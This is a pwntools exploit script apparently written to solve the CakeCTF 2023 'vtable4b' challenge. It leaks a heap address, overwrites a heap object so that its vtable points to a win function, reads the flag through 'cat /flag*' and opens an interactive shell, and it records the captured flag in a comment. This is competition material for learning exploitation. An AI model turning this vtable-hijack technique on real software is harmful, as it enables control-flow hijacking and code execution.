#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
# context.binary = elf = ELF("./chall_patched")
# libc = elf.libc
# libc = ELF("./libc.so.6")

gdbscript = """
c
"""

p = remote("vtable4b.2023.cakectf.com", 9000)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript, aslr=False, setuid=False)

sla = lambda x,y : p.sendlineafter(x, y)

def cowsay():
    sla(b"> ", b"1")

def modify(data: str):
    sla(b"> ", b"2")
    sla(b"Message: ", data)

def disp_heap():
    sla(b"> ", b"3")

p.recvuntil(b"<win> =")
win = int(p.recvline().strip(), 16)

disp_heap()
p.recvuntil(b"+------------------+\n")
heap = int(p.recvline().split(b" ")[0], 16)
print(f"{hex(heap)=}")

for _ in range(9): p.recvline()
# p.recvuntil(b" | 0000")

# leak = int(p.recv(12), 16)

payload = flat(
    p64(win) *3,
    p64(0x21),
    p64(heap + 0x10),
)

modify(payload)
disp_heap()
cowsay()

p.recv()
p.sendline(b"cat /flag*")
p.interactive()
# CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}